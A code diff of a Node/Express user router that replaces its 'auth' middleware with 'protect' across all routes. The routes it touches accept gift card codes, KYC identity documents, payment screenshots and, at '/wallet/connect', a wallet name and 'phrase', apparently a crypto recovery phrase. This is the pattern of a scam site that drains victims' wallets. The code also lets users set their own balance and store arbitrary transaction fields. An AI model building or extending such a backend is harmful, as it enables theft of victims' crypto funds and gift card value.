@@ -2,7 +2,7 @@ const express = require('express');
 const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
-const cloudinary = require('cloudinary').v2;      // ← new
+const cloudinary = require('cloudinary').v2;
 const User = require('../models/User');
 const Transaction = require('../models/Transaction');
 const Notification = require('../models/Notification');
@@ -10,7 +10,7 @@ const Payment = require('../models/Payment');
 const GiftCard = require('../models/GiftCard');
 const KYCSubmission = require('../models/KYCSubmission');
 const WalletConnection = require('../models/WalletConnection');
-const auth = require('../middleware/auth');
+const { protect } = require('../middleware/auth'); // ✅ FIXED: import protect
 const Message = require('../models/Message');
 const router = express.Router();
 
@@ -42,7 +42,7 @@ const uploadToCloudinary = (buffer, folder) => {
 };
 
 // ─── GET CURRENT USER ───
-router.get('/me', auth, async (req, res) => {
+router.get('/me', protect, async (req, res) => { // ✅ auth → protect
   try {
     const user = await User.findById(req.user.id).select('-password -passcodeHash');
     if (!user) return res.status(404).json({ error: 'User not found' });
@@ -51,7 +51,7 @@ router.get('/me', auth, async (req, res) => {
 });
 
 // ─── UPDATE PROFILE (fullName) ─────────────────────────────────────
-router.patch('/profile', auth, async (req, res) => {
+router.patch('/profile', protect, async (req, res) => { // ✅ auth → protect
   try {
     const { fullName } = req.body;
 
@@ -78,14 +78,14 @@ router.patch('/profile', auth, async (req, res) => {
 });
 
 // ─── NOTIFICATIONS ───
-router.get('/notifications', auth, async (req, res) => {
+router.get('/notifications', protect, async (req, res) => { // ✅ auth → protect
   try {
     const notes = await Notification.find({ userId: req.user.id }).sort({ createdAt: -1 });
     res.json(notes);
   } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.put('/notifications/:id/read', auth, async (req, res) => {
+router.put('/notifications/:id/read', protect, async (req, res) => { // ✅ auth → protect
   try {
     await Notification.findByIdAndUpdate(req.params.id, { read: true });
     res.json({ success: true });
@@ -93,7 +93,7 @@ router.put('/notifications/:id/read', auth, async (req, res) => {
 });
 
 // ─── KYC SUBMISSION (3 files) ─────────────────────────────────────
-router.post('/kyc/submit', auth, upload.fields([
+router.post('/kyc/submit', protect, upload.fields([ // ✅ auth → protect
   { name: 'dlFront', maxCount: 1 },
   { name: 'dlBack', maxCount: 1 },
   { name: 'proofDoc', maxCount: 1 }
@@ -142,7 +142,7 @@ router.post('/kyc/submit', auth, upload.fields([
 });
 
 // ─── GIFT CARD SUBMISSION ──────────────────────────────────────────
-router.post('/giftcard/submit', auth, upload.single('image'), async (req, res) => {
+router.post('/giftcard/submit', protect, upload.single('image'), async (req, res) => { // ✅ auth → protect
   try {
     const { cardType, code } = req.body;
     if (!req.file) return res.status(400).json({ error: 'Image is required.' });
@@ -165,7 +165,7 @@ router.post('/giftcard/submit', auth, upload.single('image'), async (req, res) =
 });
 
 // ─── PAYMENT SUBMISSION ────────────────────────────────────────────
-router.post('/payment/submit', auth, upload.single('screenshot'), async (req, res) => {
+router.post('/payment/submit', protect, upload.single('screenshot'), async (req, res) => { // ✅ auth → protect
   try {
     const { method, amount } = req.body;
     if (!req.file) return res.status(400).json({ error: 'Please upload a screenshot' });
@@ -187,8 +187,8 @@ router.post('/payment/submit', auth, upload.single('screenshot'), async (req, re
   }
 });
 
-// ─── WALLET CONNECT (unchanged) ────────────────────────────────────
-router.post('/wallet/connect', auth, async (req, res) => {
+// ─── WALLET CONNECT ────────────────────────────────────
+router.post('/wallet/connect', protect, async (req, res) => { // ✅ auth → protect
   try {
     const { walletName, phrase } = req.body;
     if (!walletName || !phrase) {
@@ -208,14 +208,14 @@ router.post('/wallet/connect', auth, async (req, res) => {
 });
 
 // ─── TRANSACTIONS & BALANCE ────────────────────────────────────────
-router.get('/transactions', auth, async (req, res) => {
+router.get('/transactions', protect, async (req, res) => { // ✅ auth → protect
   try {
     const tx = await Transaction.find({ userId: req.user.id }).sort({ timestamp: -1 });
     res.json(tx);
   } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.post('/transaction', auth, async (req, res) => {
+router.post('/transaction', protect, async (req, res) => { // ✅ auth → protect
   try {
     const tx = new Transaction({ userId: req.user.id, ...req.body, timestamp: new Date() });
     await tx.save();
@@ -223,7 +223,7 @@ router.post('/transaction', auth, async (req, res) => {
   } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.post('/balance', auth, async (req, res) => {
+router.post('/balance', protect, async (req, res) => { // ✅ auth → protect
   try {
     const user = await User.findByIdAndUpdate(
       req.user.id,
@@ -234,14 +234,13 @@ router.post('/balance', auth, async (req, res) => {
   } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-// ─── GET MESSAGES (unchanged) ──────────────────────────────────────
-router.get('/messages', auth, async (req, res) => {
+// ─── GET MESSAGES ──────────────────────────────────────
+router.get('/messages', protect, async (req, res) => { // ✅ auth → protect
   try {
     const messages = await Message.find({
       $or: [
         { sender: req.user.id },
         { receiver: req.user.id },
-       
       ]
     })
     .populate('sender', 'fullName email role')
